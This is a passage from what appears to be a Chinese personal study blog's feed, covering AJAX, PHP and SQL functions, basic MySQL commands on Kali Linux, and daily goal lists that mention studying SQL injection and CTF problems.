class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;myDiv&quot;&gt;&lt;h2&gt;使用 AJAX 修改该文本内容&lt;&#x2F;h2&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;button type&#x3D;&quot;button&quot; onclick&#x3D;&quot;loadXMLDoc()&quot;&gt;修改内容&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>是不是感觉多的一批，没事，我们慢慢来分析。</p>
<h4 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var xmlhttp;</span><br><span class="line">	if (window.XMLHttpRequest)</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F;  IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码</span><br><span class="line">		xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F; IE6, IE5 浏览器执行代码</span><br><span class="line">		xmlhttp&#x3D;new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/2.png" alt="2"></p>
<h4 id="向服务器发送请求"><a href="#向服务器发送请求" class="headerlink" title="向服务器发送请求"></a>向服务器发送请求</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;&#x2F;try&#x2F;ajax&#x2F;ajax_info.txt&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/3.png" alt="3"></p>
<p>对于GET请求：</p>
<ol>
<li>如果希望AJAX不用缓存数据以避免数据更新不及时，可给URL添加唯一ID<img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/4.png" alt="4"></li>
<li>如果希望AJAX希望通过GET发送信息，可在URL尾部添加信息<img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/5.png" alt="5"></li>
</ol>
<p>对于POST请求：</p>
<ol>
<li>如果希望通过POST上传数据，使用 setRequestHeader() 来添加 HTTP 头。然后在 send() 方法中规定您希望发送的数据<img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/6.png" alt="6"></li>
</ol>
<p>当使用 async=true 时，请规定在响应处于 <strong>onreadystatechange</strong> 事件中的就绪状态时执行的函数</p>
<h4 id="onreadystatechange-事件"><a href="#onreadystatechange-事件" class="headerlink" title="onreadystatechange 事件"></a>onreadystatechange 事件</h4><table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>onreadystatechange</td>
<td>存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。</td>
</tr>
<tr>
<td>readyState</td>
<td>存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。0: 请求未初始化   1: 服务器连接已建立   2: 请求已接收   3: 请求处理中   4: 请求已完成，且响应已就绪</td>
</tr>
<tr>
<td>status</td>
<td>200: “OK”     404: 未找到页面</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class="line">	&#123;</span><br><span class="line">		if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class="line">		&#123;</span><br><span class="line">             document.getElementById(&quot;myDiv&quot;).innerHTML&#x3D;xmlhttp.responseText;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h4 id="服务器响应"><a href="#服务器响应" class="headerlink" title="服务器响应"></a>服务器响应</h4><p>如需获得来自服务器的响应，请使用 XMLHttpRequest 对象的 responseText 或 responseXML 属性。</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>responseText</td>
<td>获得字符串形式的响应数据。</td>
</tr>
<tr>
<td>responseXML</td>
<td>获得 XML 形式的响应数据。</td>
</tr>
</tbody></table>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><a href="https://www.runoob.com/ajax/ajax-examples.html" target="_blank" rel="noopener">戳这里</a></p>
]]></content>
      <tags>
        <tag>AJAX</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入基本步骤</title>
    <url>/2020/02/06/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/</url>
    <content><![CDATA[<p><a href="https://www.jianshu.com/p/875d95f8d3cf" target="_blank" rel="noopener">sqli labs</a></p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sql concat()/concat_ws()/group_concat()函数 [连接字符串/分组]</title>
    <url>/2020/02/06/sql-concat-concat-ws-group-concat-%E5%87%BD%E6%95%B0-%E8%BF%9E%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%88%86%E7%BB%84/</url>
    <content><![CDATA[<p><a href="https://baijiahao.baidu.com/s?id=1595349117525189591&wfr=spider&for=pc" target="_blank" rel="noopener">这篇讲的超棒</a></p>
]]></content>
      <categories>
        <category>sql 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>php floor()/ceil()/round()函数 [取最接近的整数]</title>
    <url>/2020/02/05/php-floor-%E5%87%BD%E6%95%B0-%E5%90%91%E4%B8%8B%E5%8F%96%E6%9C%80%E6%8E%A5%E8%BF%91%E7%9A%84%E6%95%B4%E6%95%B0/</url>
    <content><![CDATA[<h2 id="floor-向下舍入为最接近的整数"><a href="#floor-向下舍入为最接近的整数" class="headerlink" title="floor()[向下舍入为最接近的整数]"></a>floor()[向下舍入为最接近的整数]</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo(floor(0.60) . &quot;&lt;br&gt;&quot;);</span><br><span class="line">echo(floor(0.40) . &quot;&lt;br&gt;&quot;);</span><br><span class="line">echo(floor(5) . &quot;&lt;br&gt;&quot;);</span><br><span class="line">echo(floor(5.1) . &quot;&lt;br&gt;&quot;);</span><br><span class="line">echo(floor(-5.1) . &quot;&lt;br&gt;&quot;);</span><br><span class="line">echo(floor(-5.9));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">0</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">-6</span><br><span class="line">-6</span><br></pre></td></tr></table></figure>



<h2 id="ceil-向上舍入为最接近的整数"><a href="#ceil-向上舍入为最接近的整数" class="headerlink" title="ceil()[向上舍入为最接近的整数]"></a>ceil()[向上舍入为最接近的整数]</h2><h2 id="round-四舍五入为最接近的整数"><a href="#round-四舍五入为最接近的整数" class="headerlink" title="round()[四舍五入为最接近的整数]"></a>round()[四舍五入为最接近的整数]</h2>]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
  </entry>
  <entry>
    <title>sql RPAD()函数 [补齐或缩短字符串]</title>
    <url>/2020/02/04/sql-RPAD-%E5%87%BD%E6%95%B0-%E8%A1%A5%E9%BD%90%E6%88%96%E7%BC%A9%E7%9F%AD%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="RPAD"><a href="#RPAD" class="headerlink" title="RPAD()"></a>RPAD()</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RPAD(&#39;str1&#39;,len,&#39;str2&#39;);</span><br></pre></td></tr></table></figure>

<p>如果str1长度小于len，则把str2补齐到str1右边（补到长度=len为止）。</p>
<p>如果str1长度大于len，则缩短长度到len。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><img src="/2020/02/04/sql-RPAD-%E5%87%BD%E6%95%B0-%E8%A1%A5%E9%BD%90%E6%88%96%E7%BC%A9%E7%9F%AD%E5%AD%97%E7%AC%A6%E4%B8%B2/Snipaste_2020-02-04_23-58-36.png" alt="Snipaste_2020-02-04_23-58-36"></p>
]]></content>
      <categories>
        <category>sql 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>sql MID()函数 [提取字符]</title>
    <url>/2020/02/04/sql-MID-%E5%87%BD%E6%95%B0-%E6%8F%90%E5%8F%96%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT MID(column_name,start,length) FROM table_name;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>column_name</th>
<th>必需。要提取字符的字段。</th>
</tr>
</thead>
<tbody><tr>
<td>start</td>
<td>必需。规定开始位置（起始值是 1）。</td>
</tr>
<tr>
<td>length</td>
<td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td>
</tr>
</tbody></table>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="演示数据库"><a href="#演示数据库" class="headerlink" title="演示数据库"></a>演示数据库</h3><p><img src="/2020/02/04/sql-MID-%E5%87%BD%E6%95%B0-%E6%8F%90%E5%8F%96%E5%AD%97%E7%AC%A6/1.png" alt="1"></p>
<p>结果</p>
<p><img src="/2020/02/04/sql-MID-%E5%87%BD%E6%95%B0-%E6%8F%90%E5%8F%96%E5%AD%97%E7%AC%A6/2.png" alt="2"></p>
]]></content>
      <categories>
        <category>sql 函数整理</category>
      </categories>
  </entry>
  <entry>
    <title>php sleep()函数 [延迟]</title>
    <url>/2020/02/04/php-sleep-%E5%87%BD%E6%95%B0-%E5%BB%B6%E8%BF%9F/</url>
    <content><![CDATA[<p><img src="/2020/02/04/php-sleep-%E5%87%BD%E6%95%B0-%E5%BB%B6%E8%BF%9F/2.png" alt="2"></p>
<p><img src="/2020/02/04/php-sleep-%E5%87%BD%E6%95%B0-%E5%BB%B6%E8%BF%9F/1.png" alt="1"></p>
<p><img src="/2020/02/04/php-sleep-%E5%87%BD%E6%95%B0-%E5%BB%B6%E8%BF%9F/3.png" alt="3"></p>
]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>sql field()函数 [排序]</title>
    <url>/2020/02/04/MYSQL-field-%E5%87%BD%E6%95%B0-%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<h2 id="field"><a href="#field" class="headerlink" title="field()"></a>field()</h2><p><img src="/2020/02/04/MYSQL-field-%E5%87%BD%E6%95%B0-%E6%8E%92%E5%BA%8F/1.png" alt="1"></p>
<p><img src="/2020/02/04/MYSQL-field-%E5%87%BD%E6%95%B0-%E6%8E%92%E5%BA%8F/2.png" alt="2"></p>
<p>首先来个正序排序</p>
<p><img src="/2020/02/04/MYSQL-field-%E5%87%BD%E6%95%B0-%E6%8E%92%E5%BA%8F/3.png" alt="3"></p>
<p>现在让我们来倒序排序‘seiki’,’iris’</p>
<p><img src="/2020/02/04/MYSQL-field-%E5%87%BD%E6%95%B0-%E6%8E%92%E5%BA%8F/4.png" alt="4"></p>
<p><a href="https://www.cnblogs.com/chenhaoyu/p/9771012.html" target="_blank" rel="noopener">参考博客</a></p>
]]></content>
      <categories>
        <category>sql 函数整理</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-04日目标</title>
    <url>/2020/02/03/2020-02-04%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-04日目标"><a href="#2020-02-04日目标" class="headerlink" title="2020-02-04日目标"></a>2020-02-04日目标</h2><ol>
<li>英语听力10min    </li>
<li>英语单词20个    </li>
<li>2-3篇数学通识    </li>
<li>HTTP协议第10章看完</li>
<li>mysql再看一些操作</li>
<li><a href="https://www.anquanke.com/post/id/170626?from=timeline" target="_blank" rel="noopener">看完一篇关于sql盲注的文章</a></li>
</ol>
<h2 id="2020-02-03总结"><a href="#2020-02-03总结" class="headerlink" title="2020-02-03总结"></a>2020-02-03总结</h2><p>今天在看sql盲注的时候了解到一些东西需要用MySQL测试，所以就临时改变计划，在kali上就着菜鸟教程和一篇博客大概理解了MySQL的基本操作，刚才也自己建了个测试数据表供明天使用。</p>
<table>
<thead>
<tr>
<th>目标</th>
<th>Y/N</th>
</tr>
</thead>
<tbody><tr>
<td>英语听力10min</td>
<td>Y</td>
</tr>
<tr>
<td>英语单词20个</td>
<td>Y</td>
</tr>
<tr>
<td>2-3篇数学通识</td>
<td>Y</td>
</tr>
<tr>
<td>HTTP协议第10章看完</td>
<td>N</td>
</tr>
<tr>
<td>看完菜鸟php与ajax</td>
<td>N</td>
</tr>
<tr>
<td><a href="https://www.anquanke.com/post/id/170626?from=timeline" target="_blank" rel="noopener">看完一篇关于sql盲注的文章</a></td>
<td>N</td>
</tr>
<tr>
<td>试着理解DVWA的sql low难度</td>
<td>N</td>
</tr>
<tr>
<td>状态</td>
<td>N</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>在kali linux下mysql的基本操作</title>
    <url>/2020/02/03/%E5%9C%A8kali-linux%E4%B8%8Bmysql%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>启动mysql</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql start</span><br></pre></td></tr></table></figure>

<p>先进入所在目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;mysql</span><br></pre></td></tr></table></figure>

<p>进入mysql</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>



<p><strong>注：</strong></p>
<ol>
<li><strong>以下语句为在mysql中操作，结尾必须有；</strong></li>
<li><strong>所有符号均为英文符号</strong></li>
</ol>
<p>查看所有数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p>创建数据库test</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS test DEFAULT CHARSET utf8 COLLATE utf8_general_ci;</span><br></pre></td></tr></table></figure>

<p>删除数据库test</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop test;</span><br></pre></td></tr></table></figure>

<p>进入数据库test</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use test;</span><br></pre></td></tr></table></figure>

<p>显示数据库数据test</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>

<p>创建数据表test1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE test1 (</span><br><span class="line">-&gt; column_name1 column_type1 AUTO_INCREMENT,   #规定自增属性</span><br><span class="line">-&gt; column_name2 column_type2 NOT NULL,   #不允许字段为NULL</span><br><span class="line">-&gt; PRIMARY KEY(column_name1)   #规定主键</span><br><span class="line">-&gt; )CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.runoob.com/mysql/mysql-data-types.html" target="_blank" rel="noopener">column_type</a></p>
<p>删除数据表test1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop table test1;</span><br></pre></td></tr></table></figure>

<p>显示数据表test1中数据类型与信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">describe test1;</span><br></pre></td></tr></table></figure>



<p>插入数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into test1 </span><br><span class="line">-&gt; (column_name1,column_name2)</span><br><span class="line">-&gt; values</span><br><span class="line">-&gt; (value1,value2),</span><br><span class="line">-&gt; (value3,value4);   #字符串,日期要加引号，否则报错</span><br></pre></td></tr></table></figure>

<p>查询数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT field1, field2,...fieldN FROM test1, table_name2... WHERE condition1 [AND [OR]] condition2.....</span><br></pre></td></tr></table></figure>

<p>更新数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE test1 SET field1&#x3D;new-value1, field2&#x3D;new-value2</span><br><span class="line">[WHERE Clause]</span><br></pre></td></tr></table></figure>

<p>删除数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELETE FROM table_name [WHERE Clause]</span><br></pre></td></tr></table></figure>



<h3 id="LIKE子句"><a href="#LIKE子句" class="headerlink" title="LIKE子句"></a>LIKE子句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT field1, field2,...fieldN </span><br><span class="line">FROM table_name</span><br><span class="line">WHERE field1 LIKE condition1 [AND [OR]] filed2 &#x3D; &#39;somevalue&#39;</span><br></pre></td></tr></table></figure>

<p>实例:</p>
<p>以下是我们将 runoob_tbl 表中获取 runoob_author 字段中以 <strong>COM</strong> 为结尾的的所有记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * from runoob_tbl  WHERE runoob_author LIKE &#39;%COM&#39;;</span><br></pre></td></tr></table></figure>





<h3 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a>UNION 操作符</h3><h3 id="ORDER-BY排序"><a href="#ORDER-BY排序" class="headerlink" title="ORDER BY排序"></a>ORDER BY排序</h3><p><img src="/2020/02/03/%E5%9C%A8kali-linux%E4%B8%8Bmysql%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1.png" alt="1"></p>
<h3 id="GROUP-BY-语句"><a href="#GROUP-BY-语句" class="headerlink" title="GROUP BY 语句"></a>GROUP BY 语句</h3><p><img src="/2020/02/03/%E5%9C%A8kali-linux%E4%B8%8Bmysql%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/2.png" alt="2"></p>
<h4 id="使用-WITH-ROLLUP"><a href="#使用-WITH-ROLLUP" class="headerlink" title="使用 WITH ROLLUP"></a>使用 WITH ROLLUP</h4><p>WITH ROLLUP 可以实现在分组统计数据基础上再进行相同的统计（SUM,AVG,COUNT…）。</p>
<p>例如我们将以上的数据表按名字进行分组，再统计每个人登录的次数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT name, SUM(singin) as singin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;</span><br><span class="line">+--------+--------------+</span><br><span class="line">| name   | singin_count |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| 小丽 |            2 |</span><br><span class="line">| 小明 |            7 |</span><br><span class="line">| 小王 |            7 |</span><br><span class="line">| NULL   |           16 |</span><br><span class="line">+--------+--------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>其中记录 NULL 表示所有人的登录次数。</p>
<p>我们可以使用 coalesce 来设置一个可以取代 NUll 的名称，coalesce 语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select coalesce(a,b,c);</span><br></pre></td></tr></table></figure>

<p>参数说明：如果a==null,则选择b；如果b==null,则选择c；如果a!=null,则选择a；如果a b c 都为null ，则返回为null（没意义）。</p>
<p>以下实例中如果名字为空我们使用总数代替：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT coalesce(name, &#39;总数&#39;), SUM(singin) as singin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">| coalesce(name, &#39;总数&#39;) | singin_count |</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">| 小丽                   |            2 |</span><br><span class="line">| 小明                   |            7 |</span><br><span class="line">| 小王                   |            7 |</span><br><span class="line">| 总数                   |           16 |</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">4 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>





<h3 id="连接的使用"><a href="#连接的使用" class="headerlink" title="连接的使用"></a>连接的使用</h3><p>你可以在 SELECT, UPDATE 和 DELETE 语句中使用 Mysql 的 JOIN 来联合多表查询。</p>
<p>JOIN 按照功能大致分为如下三类：</p>
<ul>
<li><strong>INNER JOIN（内连接,或等值连接）</strong>：获取两个表中字段匹配关系的记录。</li>
<li><strong>LEFT JOIN（左连接）：</strong>获取左表所有记录，即使右表没有对应匹配的记录。</li>
<li><strong>RIGHT JOIN（右连接）：</strong> 与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。</li>
</ul>
<h3 id="LIMIT子句"><a href="#LIMIT子句" class="headerlink" title="LIMIT子句"></a>LIMIT子句</h3><p>如果只给定一个参数，表示记录数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM orange LIMIT 5;     &#x2F;&#x2F;检索前5条记录(1-5)</span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * from orange LIMIT 0,5;</span><br></pre></td></tr></table></figure>

<p>两个参数，第一个参数表示offset, 第二个参数为记录数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM orange LIMIT 10,15;  &#x2F;&#x2F; 检索记录11-25</span><br></pre></td></tr></table></figure>

<p>再如，另一种用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM orange LIMIT 2 OFFSET 3;&#x2F;&#x2F;查询4-5两条记录</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM orange  LIMIT 3,2;</span><br></pre></td></tr></table></figure>

<p>另外，可以指定第二个参数为-1，用于检索从偏移量到最后一条记录。<br>(试过，MySQL报错，有待进一步验证。)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM orange LIMIT 95,-1; &#x2F;&#x2F; 检索记录96-last</span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://blog.csdn.net/lanyang123456/article/details/57522471" target="_blank" rel="noopener">https://blog.csdn.net/lanyang123456/article/details/57522471</a></p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-03日目标</title>
    <url>/2020/02/02/2020-02-03%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h2 id="2020-02-03日目标"><a href="#2020-02-03日目标" class="headerlink" title="2020-02-03日目标"></a>2020-02-03日目标</h2><ol>
<li>英语听力10min    </li>
<li>英语单词20个    </li>
<li>2-3篇数学通识    </li>
<li>HTTP协议第10章看完      </li>
<li>看完菜鸟php与ajax</li>
<li><a href="https://www.anquanke.com/post/id/170626?from=timeline" target="_blank" rel="noopener">看完一篇关于sql盲注的文章</a></li>
<li>试着理解DVWA的sql low难度</li>
</ol>
<h2 id="2020-02-02总结"><a href="#2020-02-02总结" class="headerlink" title="2020-02-02总结"></a>2020-02-02总结</h2><p>今天拿起了许久不拿的草稿纸和水笔，写了两页A4纸然后用c语言写了个程序算出首值，然后用数学归纳法证明此后皆成立，总之还蛮有成就感的。（虽然只听了一篇数学通识，但重质不重量，觉得odk）</p>
<table>
<thead>
<tr>
<th>目标</th>
<th>Y/N</th>
</tr>
</thead>
<tbody><tr>
<td>英语听力10min</td>
<td>Y</td>
</tr>
<tr>
<td>英语单词20个</td>
<td>Y</td>
</tr>
<tr>
<td>2-3篇数学通识</td>
<td>N</td>
</tr>
<tr>
<td>HTTP协议第8章看完</td>
<td>Y</td>
</tr>
<tr>
<td>做一道ctf杂项题</td>
<td>Y</td>
</tr>
<tr>
<td>b站web基础和sql注入看完</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>Y</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>php substr()函数 [返回字符串的一部分]</title>
    <url>/2020/02/01/php-substr-%E5%87%BD%E6%95%B0-%E8%BF%94%E5%9B%9E%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<h2 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>substr() 函数返回字符串的一部分。</p>
<blockquote>
<p><strong>注释：</strong>如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</p>
</blockquote>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr(string,start,length)</span><br></pre></td></tr></table></figure>



<p><img src="/2020/02/01/php-substr-%E5%87%BD%E6%95%B0-%E8%BF%94%E5%9B%9E%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86/1.png" alt="1"></p>
<h3 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h3><blockquote>
<p>返回值：返回字符串的提取部分，如果失败则返回 FALSE，或者返回一个空字符串。</p>
</blockquote>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo substr(&quot;Hello world&quot;,10).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,1).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,3).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,7).&quot;&lt;br&gt;&quot;;</span><br><span class="line"> </span><br><span class="line">echo substr(&quot;Hello world&quot;,-1).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,-10).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,-8).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,-4).&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">echo substr(&quot;Hello world&quot;,0,10).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,1,8).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,0,5).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,6,6).&quot;&lt;br&gt;&quot;;</span><br><span class="line"> </span><br><span class="line">echo substr(&quot;Hello world&quot;,0,-1).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,-10,-2).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,0,-6).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,-2-3).&quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d</span><br><span class="line">ello world</span><br><span class="line">lo world</span><br><span class="line">orld</span><br><span class="line"></span><br><span class="line">d</span><br><span class="line">ello world</span><br><span class="line">lo world</span><br><span class="line">orld</span><br><span class="line"></span><br><span class="line">Hello worl</span><br><span class="line">ello wor</span><br><span class="line">Hello</span><br><span class="line">world</span><br><span class="line"></span><br><span class="line">Hello worl</span><br><span class="line">ello wor</span><br><span class="line">Hello</span><br><span class="line">world</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-02日目标</title>
    <url>/2020/02/01/2020-02-02%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-02计划"><a href="#2020-02-02计划" class="headerlink" title="2020-02-02计划"></a>2020-02-02计划</h2><ol>
<li>英语听力10min    </li>
<li>英语单词20个    </li>
<li>2-3篇数学通识    </li>
<li>HTTP协议第9章看完    </li>
<li>做一道ctf杂项题    </li>
<li>b站ctf答疑+流量取证看完</li>
<li>bugku的sql2看懂wp</li>
</ol>
<h2 id="2020-02-01总结"><a href="#2020-02-01总结" class="headerlink" title="2020-02-01总结"></a>2020-02-01总结</h2><p>状态还OK的，计划外学了一些burpsuite爆破的方法</p>
<table>
<thead>
<tr>
<th>目标</th>
<th>Y/N</th>
</tr>
</thead>
<tbody><tr>
<td>英语听力10min</td>
<td>Y</td>
</tr>
<tr>
<td>英语单词20个</td>
<td>Y</td>
</tr>
<tr>
<td>2-3篇数学通识</td>
<td>Y</td>
</tr>
<tr>
<td>HTTP协议第8章看完</td>
<td>Y</td>
</tr>
<tr>
<td>做一道ctf杂项题</td>
<td>Y</td>
</tr>
<tr>
<td>b站web基础和sql注入看完</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>Y</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-01日目标</title>
    <url>/2020/01/31/2020-02-01%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
